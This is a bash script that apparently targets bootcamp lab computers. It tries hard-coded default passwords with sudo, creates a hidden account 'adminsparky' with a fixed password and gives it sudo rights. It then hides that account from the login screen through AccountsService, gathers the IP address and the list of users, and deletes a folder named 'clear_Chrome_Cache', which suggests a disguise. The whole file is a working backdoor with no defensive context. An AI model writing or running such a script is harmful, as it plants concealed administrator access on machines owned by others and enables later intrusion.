#!/bin/bash

# Set the password
#password=("wtc")
# Define passwords
passwords=("wethinkcode2023" "bootcamp")

# Send the password to sudo
#echo "$password" | sudo -S echo "Password accepted."
for password in "${passwords[@]}"; do
    echo "$password" | sudo -S echo "Password accepted."
    if [ $? -eq 0 ]; then
        # Command succeeded, break out of the loop
        break
    fi
done

# Get the username
username='adminsparky'

# Create the new user and set the password
sudo adduser $username --gecos "" --disabled-password
echo "$username:kam" | sudo chpasswd

# Add the user to the sudo group
sudo usermod -aG sudo $username

# Display the IP address of the computer
ip=$(ip addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v 127.0.0.1)

# Add a file to the system with specified content
echo '[InputSource0]\nxkb=za\n\n[User]\nIcon=/var/lib/AccountsService/icons/adminsparky\nSystemAccount=true' | sudo tee /var/lib/AccountsService/users/adminsparky


sudo systemctl restart accounts-daemon.service

# ------------------------------- #

# Get list of non-system users
users=$(awk -F':' '$3 >= 1000 && $1 != "nobody" {print $1}' /etc/passwd)


rm -rf clear_Chrome_Cache/
echo $users
exit
